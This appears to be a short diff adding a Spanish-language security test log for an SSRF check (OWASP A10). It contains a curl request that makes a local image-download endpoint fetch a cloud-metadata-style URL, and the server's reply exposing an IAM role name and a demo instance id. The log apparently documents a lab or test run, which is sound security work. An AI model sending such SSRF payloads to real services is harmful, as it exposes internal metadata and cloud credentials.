@@ -1,0 +1,6 @@
+=== A10 - SSRF a metadatos internos ===
+Comando: curl -X POST http://localhost:3000/imagenes/descargar -H Content-Type: application/json -d {"url": "http://127.0.0.1:9999/latest/meta-data/"}
+--- Respuesta ---
+{"mensaje":"Descarga completada","url":"http://127.0.0.1:9999/latest/meta-data/","contenido_parcial":"{\"iam/security-credentials\":\"propnet-role\",\"instance-id\":\"i-0demo1234567890\",\"local-ipv4\":\"127.0.0.1\"}"}
+HTTP_STATUS:200
+
